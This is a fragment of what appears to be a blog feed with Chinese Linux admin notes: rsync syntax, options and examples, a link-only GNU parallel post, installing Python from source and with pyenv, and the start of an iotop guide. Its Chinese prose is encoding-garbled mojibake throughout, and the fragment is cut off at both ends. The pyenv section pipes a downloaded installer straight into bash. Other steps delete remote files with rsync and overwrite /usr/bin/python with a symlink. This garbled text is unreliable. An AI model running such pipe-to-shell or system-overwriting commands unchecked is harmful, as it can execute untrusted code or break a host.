        <content type="html"><![CDATA[<h2 id="Rsync"><a href="#Rsync" class="headerlink" title="Rsync"></a>Rsync</h2><p>rsyncå‘½ä»¤å¸¸ç”¨å·¥å…·å‘½ä»¤ rsyncå‘½ä»¤æ˜¯ä¸€ä¸ªè¿œç¨‹æ•°æ®åŒæ­¥å·¥å…·ï¼Œå¯é€šè¿‡LAN&#x2F;WANå¿«é€ŸåŒæ­¥å¤šå°ä¸»æœºé—´çš„æ–‡ä»¶ã€‚rsyncä½¿ç”¨æ‰€è°“çš„â€œrsyncç®—æ³•â€æ¥ä½¿æœ¬åœ°å’Œè¿œç¨‹ä¸¤ä¸ªä¸»æœºä¹‹é—´çš„æ–‡ä»¶è¾¾åˆ°åŒæ­¥ï¼Œè¿™ä¸ªç®—æ³•åªä¼ é€ä¸¤ä¸ªæ–‡ä»¶çš„ä¸åŒéƒ¨åˆ†ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½æ•´ä»½ä¼ é€ï¼Œå› æ­¤é€Ÿåº¦ç›¸å½“å¿«ã€‚</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rsync [OPTION]... SRC DEST</span><br><span class="line">rsync [OPTION]... SRC [USER@]host:DEST</span><br><span class="line">rsync [OPTION]... [USER@]HOST:SRC DEST</span><br><span class="line">rsync [OPTION]... [USER@]HOST::SRC DEST</span><br><span class="line">rsync [OPTION]... SRC [USER@]HOST::DEST</span><br><span class="line">rsync [OPTION]...</span><br><span class="line">rsync://[USER@]HOST[:PORT]/SRC [DEST]</span><br></pre></td></tr></table></figure><p>å¯¹åº”äºä»¥ä¸Šå…­ç§å‘½ä»¤æ ¼å¼ï¼Œrsyncæœ‰å…­ç§ä¸åŒçš„å·¥ä½œæ¨¡å¼ï¼š   </p><ol><li>æ‹·è´æœ¬åœ°æ–‡ä»¶ã€‚å½“SRCå’ŒDESè·¯å¾„ä¿¡æ¯éƒ½ä¸åŒ…å«æœ‰å•ä¸ªå†’å·â€:â€åˆ†éš”ç¬¦æ—¶å°±å¯åŠ¨è¿™ç§å·¥ä½œæ¨¡å¼ã€‚å¦‚ï¼šrsync -a &#x2F;data &#x2F;backup</li><li>ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åº(å¦‚rshã€ssh)æ¥å®ç°å°†æœ¬åœ°æœºå™¨çš„å†…å®¹æ‹·è´åˆ°è¿œç¨‹æœºå™¨ã€‚å½“DSTè·¯å¾„åœ°å€åŒ…å«å•ä¸ªå†’å·â€:â€åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚å¦‚ï¼šrsync -avz *.c foo:src</li><li>ä½¿ç”¨ä¸€ä¸ªè¿œç¨‹shellç¨‹åº(å¦‚rshã€ssh)æ¥å®ç°å°†è¿œç¨‹æœºå™¨çš„å†…å®¹æ‹·è´åˆ°æœ¬åœ°æœºå™¨ã€‚å½“SRCåœ°å€è·¯å¾„åŒ…å«å•ä¸ªå†’å·â€:â€åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚å¦‚ï¼šrsync -avz foo:src&#x2F;bar &#x2F;data</li><li>ä»è¿œç¨‹rsyncæœåŠ¡å™¨ä¸­æ‹·è´æ–‡ä»¶åˆ°æœ¬åœ°æœºã€‚å½“SRCè·¯å¾„ä¿¡æ¯åŒ…å«â€::â€åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚å¦‚ï¼šrsync -av <a href="mailto:&#114;&#111;&#x6f;&#116;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#x37;&#56;&#x2e;&#49;&#57;&#50;">root@192.168.78.192</a>::www &#x2F;databack</li><li>ä»æœ¬åœ°æœºå™¨æ‹·è´æ–‡ä»¶åˆ°è¿œç¨‹rsyncæœåŠ¡å™¨ä¸­ã€‚å½“DSTè·¯å¾„ä¿¡æ¯åŒ…å«â€::â€åˆ†éš”ç¬¦æ—¶å¯åŠ¨è¯¥æ¨¡å¼ã€‚å¦‚ï¼šrsync -av &#x2F;databack <a href="mailto:&#114;&#x6f;&#111;&#116;&#x40;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#55;&#56;&#46;&#49;&#x39;&#50;">root@192.168.78.192</a>::www</li><li>åˆ—è¿œç¨‹æœºçš„æ–‡ä»¶åˆ—è¡¨ã€‚è¿™ç±»ä¼¼äºrsyncä¼ è¾“ï¼Œä¸è¿‡åªè¦åœ¨å‘½ä»¤ä¸­çœç•¥æ‰æœ¬åœ°æœºä¿¡æ¯å³å¯ã€‚å¦‚ï¼šrsync -v rsync:&#x2F;&#x2F;192.168.78.192&#x2F;www</li></ol><blockquote><p>æ³¨æ„ï¼šä½¿ç”¨<code>rsync</code>æ—¶è¦æ±‚åŒæ–¹æœºå™¨éƒ½è¦å®‰è£…<code>rsync</code></p></blockquote><h3 id="é€‰é¡¹"><a href="#é€‰é¡¹" class="headerlink" title="é€‰é¡¹"></a>é€‰é¡¹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">-v, --verbose è¯¦ç»†æ¨¡å¼è¾“å‡ºã€‚</span><br><span class="line">-q, --quiet ç²¾ç®€è¾“å‡ºæ¨¡å¼ã€‚</span><br><span class="line">-c, --checksum æ‰“å¼€æ ¡éªŒå¼€å…³ï¼Œå¼ºåˆ¶å¯¹æ–‡ä»¶ä¼ è¾“è¿›è¡Œæ ¡éªŒã€‚</span><br><span class="line">-a, --archive å½’æ¡£æ¨¡å¼ï¼Œè¡¨ç¤ºä»¥é€’å½’æ–¹å¼ä¼ è¾“æ–‡ä»¶ï¼Œå¹¶ä¿æŒæ‰€æœ‰æ–‡ä»¶å±æ€§ï¼Œç­‰äº-rlptgoDã€‚</span><br><span class="line">-r, --recursive å¯¹å­ç›®å½•ä»¥é€’å½’æ¨¡å¼å¤„ç†ã€‚</span><br><span class="line">-R, --relative ä½¿ç”¨ç›¸å¯¹è·¯å¾„ä¿¡æ¯ã€‚</span><br><span class="line">-b, --backup åˆ›å»ºå¤‡ä»½ï¼Œä¹Ÿå°±æ˜¯å¯¹äºç›®çš„å·²ç»å­˜åœ¨æœ‰åŒæ ·çš„æ–‡ä»¶åæ—¶ï¼Œå°†è€çš„æ–‡ä»¶é‡æ–°å‘½åä¸º~filenameã€‚å¯ä»¥ä½¿ç”¨--suffixé€‰é¡¹æ¥æŒ‡å®šä¸åŒçš„å¤‡ä»½æ–‡ä»¶å‰ç¼€ã€‚</span><br><span class="line">--backup-dir å°†å¤‡ä»½æ–‡ä»¶(å¦‚~filename)å­˜æ”¾åœ¨åœ¨ç›®å½•ä¸‹ã€‚</span><br><span class="line">-suffix=SUFFIX å®šä¹‰å¤‡ä»½æ–‡ä»¶å‰ç¼€ã€‚</span><br><span class="line">-u, --update ä»…ä»…è¿›è¡Œæ›´æ–°ï¼Œä¹Ÿå°±æ˜¯è·³è¿‡æ‰€æœ‰å·²ç»å­˜åœ¨äºDSTï¼Œå¹¶ä¸”æ–‡ä»¶æ—¶é—´æ™šäºè¦å¤‡ä»½çš„æ–‡ä»¶ï¼Œä¸è¦†ç›–æ›´æ–°çš„æ–‡ä»¶ã€‚</span><br><span class="line">-l, --links ä¿ç•™è½¯é“¾ç»“ã€‚</span><br><span class="line">-L, --copy-links æƒ³å¯¹å¾…å¸¸è§„æ–‡ä»¶ä¸€æ ·å¤„ç†è½¯é“¾ç»“ã€‚</span><br><span class="line">--copy-unsafe-links ä»…ä»…æ‹·è´æŒ‡å‘SRCè·¯å¾„ç›®å½•æ ‘ä»¥å¤–çš„é“¾ç»“ã€‚</span><br><span class="line">--safe-links å¿½ç•¥æŒ‡å‘SRCè·¯å¾„ç›®å½•æ ‘ä»¥å¤–çš„é“¾ç»“ã€‚</span><br><span class="line">-H, --hard-links ä¿ç•™ç¡¬é“¾ç»“ã€‚</span><br><span class="line">-p, --perms ä¿æŒæ–‡ä»¶æƒé™ã€‚</span><br><span class="line">-o, --owner ä¿æŒæ–‡ä»¶å±ä¸»ä¿¡æ¯ã€‚</span><br><span class="line">-g, --group ä¿æŒæ–‡ä»¶å±ç»„ä¿¡æ¯ã€‚</span><br><span class="line">-D, --devices ä¿æŒè®¾å¤‡æ–‡ä»¶ä¿¡æ¯ã€‚</span><br><span class="line">-t, --times ä¿æŒæ–‡ä»¶æ—¶é—´ä¿¡æ¯ã€‚</span><br><span class="line">-S, --sparse å¯¹ç¨€ç–æ–‡ä»¶è¿›è¡Œç‰¹æ®Šå¤„ç†ä»¥èŠ‚çœDSTçš„ç©ºé—´ã€‚</span><br><span class="line">-n, --dry-runç°å®å“ªäº›æ–‡ä»¶å°†è¢«ä¼ è¾“ã€‚</span><br><span class="line">-w, --whole-file æ‹·è´æ–‡ä»¶ï¼Œä¸è¿›è¡Œå¢é‡æ£€æµ‹ã€‚</span><br><span class="line">-x, --one-file-system ä¸è¦è·¨è¶Šæ–‡ä»¶ç³»ç»Ÿè¾¹ç•Œã€‚</span><br><span class="line">-B, --block-size=SIZE æ£€éªŒç®—æ³•ä½¿ç”¨çš„å—å°ºå¯¸ï¼Œé»˜è®¤æ˜¯700å­—èŠ‚ã€‚</span><br><span class="line">-e, --rsh=command æŒ‡å®šä½¿ç”¨rshã€sshæ–¹å¼è¿›è¡Œæ•°æ®åŒæ­¥ã€‚</span><br><span class="line">--rsync-path=PATH æŒ‡å®šè¿œç¨‹æœåŠ¡å™¨ä¸Šçš„rsyncå‘½ä»¤æ‰€åœ¨è·¯å¾„ä¿¡æ¯ã€‚</span><br><span class="line">-C, --cvs-exclude ä½¿ç”¨å’ŒCVSä¸€æ ·çš„æ–¹æ³•è‡ªåŠ¨å¿½ç•¥æ–‡ä»¶ï¼Œç”¨æ¥æ’é™¤é‚£äº›ä¸å¸Œæœ›ä¼ è¾“çš„æ–‡ä»¶ã€‚</span><br><span class="line">--existing ä»…ä»…æ›´æ–°é‚£äº›å·²ç»å­˜åœ¨äºDSTçš„æ–‡ä»¶ï¼Œè€Œä¸å¤‡ä»½é‚£äº›æ–°åˆ›å»ºçš„æ–‡ä»¶ã€‚</span><br><span class="line">--delete åˆ é™¤é‚£äº›DSTä¸­SRCæ²¡æœ‰çš„æ–‡ä»¶ã€‚</span><br><span class="line">--delete-excluded åŒæ ·åˆ é™¤æ¥æ”¶ç«¯é‚£äº›è¢«è¯¥é€‰é¡¹æŒ‡å®šæ’é™¤çš„æ–‡ä»¶ã€‚</span><br><span class="line">--delete-after ä¼ è¾“ç»“æŸä»¥åå†åˆ é™¤ã€‚</span><br><span class="line">--ignore-errors åŠæ—¶å‡ºç°IOé”™è¯¯ä¹Ÿè¿›è¡Œåˆ é™¤ã€‚</span><br><span class="line">--max-delete=NUM æœ€å¤šåˆ é™¤NUMä¸ªæ–‡ä»¶ã€‚</span><br><span class="line">--partial ä¿ç•™é‚£äº›å› æ•…æ²¡æœ‰å®Œå…¨ä¼ è¾“çš„æ–‡ä»¶ï¼Œä»¥æ˜¯åŠ å¿«éšåçš„å†æ¬¡ä¼ è¾“ã€‚</span><br><span class="line">--force å¼ºåˆ¶åˆ é™¤ç›®å½•ï¼Œå³ä½¿ä¸ä¸ºç©ºã€‚</span><br><span class="line">--numeric-ids ä¸å°†æ•°å­—çš„ç”¨æˆ·å’Œç»„idåŒ¹é…ä¸ºç”¨æˆ·åå’Œç»„åã€‚</span><br><span class="line">--timeout=time ipè¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’ã€‚</span><br><span class="line">-I, --ignore-times ä¸è·³è¿‡é‚£äº›æœ‰åŒæ ·çš„æ—¶é—´å’Œé•¿åº¦çš„æ–‡ä»¶ã€‚</span><br><span class="line">--size-only å½“å†³å®šæ˜¯å¦è¦å¤‡ä»½æ–‡ä»¶æ—¶ï¼Œä»…ä»…å¯Ÿçœ‹æ–‡ä»¶å¤§å°è€Œä¸è€ƒè™‘æ–‡ä»¶æ—¶é—´ã€‚</span><br><span class="line">--modify-window=NUM å†³å®šæ–‡ä»¶æ˜¯å¦æ—¶é—´ç›¸åŒæ—¶ä½¿ç”¨çš„æ—¶é—´æˆ³çª—å£ï¼Œé»˜è®¤ä¸º0ã€‚</span><br><span class="line">-T --temp-dir=DIR åœ¨DIRä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚</span><br><span class="line">--compare-dest=DIR åŒæ ·æ¯”è¾ƒDIRä¸­çš„æ–‡ä»¶æ¥å†³å®šæ˜¯å¦éœ€è¦å¤‡ä»½ã€‚</span><br><span class="line">-P ç­‰åŒäº --partialã€‚</span><br><span class="line">--progress æ˜¾ç¤ºå¤‡ä»½è¿‡ç¨‹ã€‚</span><br><span class="line">-z, --compress å¯¹å¤‡ä»½çš„æ–‡ä»¶åœ¨ä¼ è¾“æ—¶è¿›è¡Œå‹ç¼©å¤„ç†ã€‚</span><br><span class="line">--exclude=PATTERN æŒ‡å®šæ’é™¤ä¸éœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ¨¡å¼ã€‚</span><br><span class="line">--include=PATTERN æŒ‡å®šä¸æ’é™¤è€Œéœ€è¦ä¼ è¾“çš„æ–‡ä»¶æ¨¡å¼ã€‚</span><br><span class="line">--exclude-from=FILE æ’é™¤FILEä¸­æŒ‡å®šæ¨¡å¼çš„æ–‡ä»¶ã€‚</span><br><span class="line">--include-from=FILE ä¸æ’é™¤FILEæŒ‡å®šæ¨¡å¼åŒ¹é…çš„æ–‡ä»¶ã€‚</span><br><span class="line">--version æ‰“å°ç‰ˆæœ¬ä¿¡æ¯ã€‚</span><br><span class="line">--address ç»‘å®šåˆ°ç‰¹å®šçš„åœ°å€ã€‚</span><br><span class="line">--config=FILE æŒ‡å®šå…¶ä»–çš„é…ç½®æ–‡ä»¶ï¼Œä¸ä½¿ç”¨é»˜è®¤çš„rsyncd.confæ–‡ä»¶ã€‚</span><br><span class="line">--port=PORT æŒ‡å®šå…¶ä»–çš„rsyncæœåŠ¡ç«¯å£ã€‚</span><br><span class="line">--blocking-io å¯¹è¿œç¨‹shellä½¿ç”¨é˜»å¡IOã€‚</span><br><span class="line">-stats ç»™å‡ºæŸäº›æ–‡ä»¶çš„ä¼ è¾“çŠ¶æ€ã€‚</span><br><span class="line">--progress åœ¨ä¼ è¾“æ—¶ç°å®ä¼ è¾“è¿‡ç¨‹ã€‚</span><br><span class="line">--log-format=formAT æŒ‡å®šæ—¥å¿—æ–‡ä»¶æ ¼å¼ã€‚</span><br><span class="line">--password-file=FILE ä»FILEä¸­å¾—åˆ°å¯†ç ã€‚</span><br><span class="line">--bwlimit=KBPS é™åˆ¶I/Oå¸¦å®½ï¼ŒKBytes per secondã€‚</span><br><span class="line">-h, --help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><ol><li><p>åŒæ­¥æœ¬åœ°æ–‡ä»¶å¤¹</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz src dest</span><br></pre></td></tr></table></figure></li><li><p>æ‹‰å–è¿œç¨‹æ–‡ä»¶åˆ°æœ¬åœ°</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azve &#x27;ssh&#x27; root@10.0.1.4:/root/logs .</span><br></pre></td></tr></table></figure><blockquote><p>ä½¿ç”¨sshæ–¹å¼åå°ä¼ è¾“æ—¶å¯ä»¥é…åˆsshpassæŒ‡å®šå¯†ç </p></blockquote></li><li><p>ä¼ é€æœ¬åœ°æ–‡ä»¶åˆ°è¿œç¨‹</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azve &#x27;ssh&#x27; . root@10.0.1.4:/root/logs</span><br></pre></td></tr></table></figure></li><li><p>æŒ‡å®šSSHç«¯å£</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azve &#x27;ssh -p 9922&#x27; data root@10.0.1.4:/root/</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤è¿œç¨‹æœ‰æœ¬åœ°æ²¡æœ‰çš„æ–‡ä»¶</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azve &#x27;ssh&#x27; --delete data root@10.0.1.4:/root/</span><br></pre></td></tr></table></figure></li><li><p>æ–­çº¿ç»­ä¼ </p><p> -P </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -azvPe &#x27;ssh&#x27; root@10.0.1.4:/root/logs .</span><br></pre></td></tr></table></figure><p> â€“bwlimit &#x2F;&#x2F; é™é€Ÿ</p></li><li><p>æ’é™¤æ–‡ä»¶å¤¹</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -avz --exclude &quot;.git&quot; src dest</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://man.linuxde.net/rsync">rsyncå‘½ä»¤</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>gnu-paralell</title>
      <link href="/post/gnu-paralell.html"/>
      <url>/post/gnu-paralell.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.jduck.net/blog/2014/09/30/gnu-paralell/">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®‰è£…Python</title>
      <link href="/post/install-python.html"/>
      <url>/post/install-python.html</url>
      
        <content type="html"><![CDATA[<h2 id="å®‰è£…Python"><a href="#å®‰è£…Python" class="headerlink" title="å®‰è£…Python"></a>å®‰è£…Python</h2><h3 id="æºç å®‰è£…"><a href="#æºç å®‰è£…" class="headerlink" title="æºç å®‰è£…"></a>æºç å®‰è£…</h3><ol><li><p>ä¸‹è½½æºç </p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/2.7.12/Python-2.7.12.tgz</span><br></pre></td></tr></table></figure></li><li><p>è§£å‹</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf Python-2.7.12.tgz</span><br></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘å®‰è£…</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd Python-2.7.12</span><br></pre></td></tr></table></figure> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./configure  </span><br><span class="line">make all</span><br><span class="line">make install</span><br><span class="line">make clean</span><br><span class="line">make distclean</span><br></pre></td></tr></table></figure></li><li><p>å»ºç«‹è½¯è¿æ¥ï¼Œä½¿ç³»ç»Ÿé»˜è®¤çš„ pythonæŒ‡å‘ python2.7</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/bin/python2.7 /usr/bin/python  </span><br></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹ç‰ˆæœ¬</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -V</span><br></pre></td></tr></table></figure></li></ol><h3 id="pyenv"><a href="#pyenv" class="headerlink" title="pyenv"></a>pyenv</h3><p>ç”±äºPython3å’Œ2ä¸å…¼å®¹ï¼Œç³»ç»Ÿä¸­ä½¿ç”¨çš„éƒ¨åˆ†è½¯ä»¶å¯èƒ½æ˜¯ä½¿ç”¨çš„Python2ç¼–å†™çš„ï¼Œä¾‹å¦‚yumã€‚æˆ‘ä»¬å¼€å‘ä¸­å¯èƒ½åˆéœ€è¦ä½¿ç”¨Python3ï¼Œå¦‚æœç›´æ¥è£…å…¨å±€çš„Python3å¯èƒ½å¾ˆå¤šè½¯ä»¶å°±æ— æ³•è¿è¡Œã€‚è¿™ç§æƒ…å†µä¸‹å°±éœ€è¦ä¸€ä¸ªPythonç‰ˆæœ¬ç®¡ç†è½¯ä»¶ï¼Œpyenvæ­£æ˜¯è§£å†³è¿™ç§é—®é¢˜çš„ã€‚</p><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p><a href="https://github.com/pyenv/pyenv-installer">https://github.com/pyenv/pyenv-installer</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L https://github.com/pyenv/pyenv-installer/raw/master/bin/pyenv-installer | bash</span><br></pre></td></tr></table></figure><h4 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h4><ol><li><p>pyenv versionsï¼šåˆ—å‡ºç³»ç»Ÿå®‰è£…çš„Pythonç‰ˆæœ¬</p></li><li><p>pyenv versionï¼šæŸ¥çœ‹å½“å‰ç‰ˆæœ¬</p></li><li><p>pyenv install 3.7.0ï¼šå®‰è£…3.7.0ç‰ˆæœ¬åˆ°ç³»ç»Ÿ</p><p> å¦‚æœç›´æ¥å®‰è£…å¤ªæ…¢å¯ä»¥é‡‡ç”¨ç¦»çº¿å®‰è£…çš„æ–¹æ³•ï¼š</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz -P ~/.pyenv/cache</span><br><span class="line">export PYENV_ROOT=$HOME/.pyenv</span><br><span class="line">pyenv install 3.7.0 </span><br></pre></td></tr></table></figure></li><li><p>pyenv uninstall 3.7.0ï¼šå¸è½½3.7.0ç‰ˆæœ¬</p></li><li><p>pyenv global 3.7.0ï¼šè®¾ç½®å…¨å±€Pythonç‰ˆæœ¬</p></li><li><p>pyenv local 3.7.0ï¼šè®¾ç½®æœ¬åœ°ï¼ˆå½“å‰ç›®å½•ï¼‰Pythonç‰ˆæœ¬</p></li><li><p>pyenv shell 3.7.0ï¼šè®¾ç½®å½“å‰Shell Pythonç‰ˆæœ¬</p><p> è¿™ä¸ªç‰ˆæœ¬çš„ä¼˜å…ˆçº§æ¯” local å’Œ global éƒ½è¦é«˜ã€‚<code>pyenv shell --unset</code>ï¼ˆæˆ–è€…ä½¿ç”¨<code>unset PYENV_VERSION</code>ï¼‰ç”¨æ¥å–æ¶ˆä¹‹å‰çš„è®¾å®šã€‚</p></li></ol><h3 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h3><ol><li><p>å‡çº§åYUMä¸èƒ½ä½¿ç”¨</p><p> ç¼–è¾‘<code>/usr/bin/yum</code>ï¼Œå°†å¤´éƒ¨çš„<code>#!/usr/bin/python</code>æ”¹ä¸º<code>#!/usr/bin/python2.6</code></p></li><li><p><a href="https://github.com/pypa/pip/issues/1919">zipimport.ZipImportError</a></p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix= --with-zlib-dir=/usr/local/lib</span><br></pre></td></tr></table></figure></li><li><p>ModuleNotFoundError: No module named â€˜_ctypesâ€™</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libffi-dev </span><br><span class="line"># or </span><br><span class="line">yum install libffi-devel</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iotop</title>
      <link href="/post/iotop.html"/>
      <url>/post/iotop.html</url>
      
        <content type="html"><![CDATA[<h3 id="iotopå‘½ä»¤"><a href="#iotopå‘½ä»¤" class="headerlink" title="iotopå‘½ä»¤"></a>iotopå‘½ä»¤</h3><p>iotop å‘½ä»¤æ˜¯ä¸€ä¸ªç”¨æ¥ç›‘è§†ç£ç›˜ I&#x2F;O ä½¿ç”¨çŠ¶å†µçš„ top ç±»å·¥å…·ã€‚iotop å…·æœ‰ä¸ top ç›¸ä¼¼çš„ UIï¼Œå…¶ä¸­åŒ…æ‹¬ PIDã€ç”¨æˆ·ã€I&#x2F;Oã€è¿›ç¨‹ç­‰ç›¸å…³ä¿¡æ¯ã€‚Linux ä¸‹çš„ IO ç»Ÿè®¡å·¥å…·å¦‚ iostatï¼Œnmon ç­‰å¤§å¤šæ•°æ˜¯åªèƒ½ç»Ÿè®¡åˆ° per è®¾å¤‡çš„è¯»å†™æƒ…å†µï¼Œå¦‚æœä½ æƒ³çŸ¥é“æ¯ä¸ªè¿›ç¨‹æ˜¯å¦‚ä½•ä½¿ç”¨IOçš„å°±æ¯”è¾ƒéº»çƒ¦ï¼Œä½¿ç”¨ iotop å‘½ä»¤å¯ä»¥å¾ˆæ–¹ä¾¿çš„æŸ¥çœ‹ã€‚</p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install iotop</span><br></pre></td></tr></table></figure><h4 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install iotop</span><br></pre></td></tr></table></figure><h4 id="ç¼–è¯‘å®‰è£…"><a href="#ç¼–è¯‘å®‰è£…" class="headerlink" title="ç¼–è¯‘å®‰è£…"></a>ç¼–è¯‘å®‰è£…</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://guichaz.free.fr/iotop/files/iotop-0.4.4.tar.gz</span><br><span class="line">tar zxf iotop-0.4.4.tar.gz</span><br><span class="line">python setup.py build</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iotop (é€‰é¡¹)</span><br></pre></td></tr></table></figure><h3 id="é€‰é¡¹"><a href="#é€‰é¡¹" class="headerlink" title="é€‰é¡¹"></a>é€‰é¡¹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-oï¼šåªæ˜¾ç¤ºæœ‰ioæ“ä½œçš„è¿›ç¨‹</span><br><span class="line">-bï¼šæ‰¹é‡æ˜¾ç¤ºï¼Œæ— äº¤äº’ï¼Œä¸»è¦ç”¨ä½œè®°å½•åˆ°æ–‡ä»¶ã€‚</span><br><span class="line">-n 